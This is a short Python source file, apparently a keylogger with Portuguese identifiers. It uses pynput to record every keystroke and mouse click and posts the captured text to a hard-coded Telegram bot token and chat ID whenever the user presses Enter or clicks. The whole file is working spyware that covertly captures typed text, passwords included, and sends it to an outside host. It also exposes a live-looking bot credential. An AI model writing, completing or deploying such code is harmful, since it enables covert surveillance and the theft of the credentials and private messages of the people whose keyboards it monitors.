from pynput.keyboard import Key, Listener
from pynput import mouse
import requests
import telebot
import subprocess
import os

todas_palavras = '' 
cada_palavra = ''

bot_token = '8792947347:AAGOt6XmG9UZ59QPY93CTaJG6_3ZWUK8zmU'
chat_id = '8890536354'
bot = telebot.TeleBot(bot_token)

def onpress(key):
    global cada_palavra
    global todas_palavras

    if key == Key.esc:
        return False

    elif key == Key.space:
        cada_palavra += ' '

    elif key == Key.backspace:
        cada_palavra = cada_palavra[:-1]

    elif key == Key.enter:
        todas_palavras += cada_palavra + '\n'
        send(todas_palavras)
        cada_palavra = ''
        todas_palavras = ''

    else:
        try:
            cada_palavra += key.char
        except AttributeError:
            pass


def click(x,y, botao, pressed):
    global cada_palavra
    global todas_palavras

    if len(cada_palavra) > 0 and pressed:
        todas_palavras += cada_palavra + '\n'
        send(todas_palavras)
        cada_palavra = ''
        todas_palavras = ''
    else:
        pass

def send(message):
    if not message.strip(): 
        return
        
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    dados = {
        'chat_id': chat_id,
        'text': message
    }
    try:
        requests.post(url, json=dados, timeout=10)
    except Exception as e:
        print(f"Erro de conexão: {e}")

def main():
    with Listener(on_press=onpress) as k_listener, mouse.Listener(on_click=click) as m_listerner:
        k_listener.join()
        m_listerner.join()

if __name__ == '__main__':
    main()
